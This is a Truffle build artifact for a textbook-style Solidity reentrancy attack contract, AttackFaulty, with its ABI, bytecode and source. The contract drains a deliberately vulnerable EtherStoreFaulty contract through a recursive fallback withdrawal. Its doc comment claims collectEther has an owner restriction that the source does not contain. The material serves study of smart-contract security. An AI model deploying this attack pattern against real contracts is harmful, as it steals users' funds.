{
  "contractName": "AttackFaulty",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreFaultyAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "etherStoreFaulty",
      "outputs": [
        {
          "internalType": "contract EtherStoreFaulty",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "attackEtherStoreFaulty",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "collectEther",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516104663803806104668339818101604052602081101561003357600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506103d2806100946000396000f3fe6080604052600436106100385760003560e01c80633a0e43ee146101185780639c3878f514610122578063ff11e1db1461017957610039565b5b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610116576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b1580156100fd57600080fd5b505af1158015610111573d6000803e3d6000fd5b505050505b005b610120610190565b005b34801561012e57600080fd5b5061013761032e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561018557600080fd5b5061018e610353565b005b670de0b6b3a764000034101561020e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f526571756972656420312065746865722e00000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e2c41dbc670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b15801561027f57600080fd5b505af1158015610293573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663155dd5ee670de0b6b3a76400006040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561031457600080fd5b505af1158015610328573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b3373ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f19350505050158015610399573d6000803e3d6000fd5b5056fea2646970667358221220fc42a2c79e67120ab876dd216552aa2d9025f601439c7aed46050c91d9108baf64736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport {EtherStoreFaulty} from \"./EtherStoreFaulty.sol\";\nimport {Owned} from \"./Owned.sol\";\n\n/**\n * @title Mastering Ethereum Chapter 9, Attack contract.\n * @author Victor Navascues.\n * @notice Exploits EtherStoreFaulty contract, stealing all its funds via\n * reentrancy attack.\n * @dev This contract has been modified regarding the original one, by adding\n * and access modified in the `collectEther()` function (inheriting `Owned`).\n */\ncontract AttackFaulty {\n    EtherStoreFaulty public etherStoreFaulty;\n\n    constructor(address _etherStoreFaultyAddress) public {\n        etherStoreFaulty = EtherStoreFaulty(_etherStoreFaultyAddress);\n    }\n\n    // receive() external payable {}\n\n    function attackEtherStoreFaulty() external payable {\n        require(msg.value >= 1 ether, \"Required 1 ether.\");\n        etherStoreFaulty.depositFunds{value: 1 ether}();\n        etherStoreFaulty.withdrawFunds(1 ether);\n    }\n\n    function collectEther() public {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    fallback() external payable {\n        if (address(etherStoreFaulty).balance > 1 ether) {\n            etherStoreFaulty.withdrawFunds(1 ether);\n        }\n    }\n}\n",
  "sourcePath": "/home/victor/Projects/ethereum/solidity_playground/mastering_ethereum/truffle/SCSecurity/contracts/reentrancy_attack/AttackFaulty.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.2.0",
  "updatedAt": "2020-07-06T17:12:55.925Z",
  "networkType": "ethereum",
  "devdoc": {
    "author": "Victor Navascues.",
    "details": "This contract has been modified regarding the original one, by adding and access modified in the `collectEther()` function (inheriting `Owned`).",
    "methods": {},
    "title": "Mastering Ethereum Chapter 9, Attack contract."
  },
  "userdoc": {
    "methods": {},
    "notice": "Exploits EtherStoreFaulty contract, stealing all its funds via reentrancy attack."
  }
}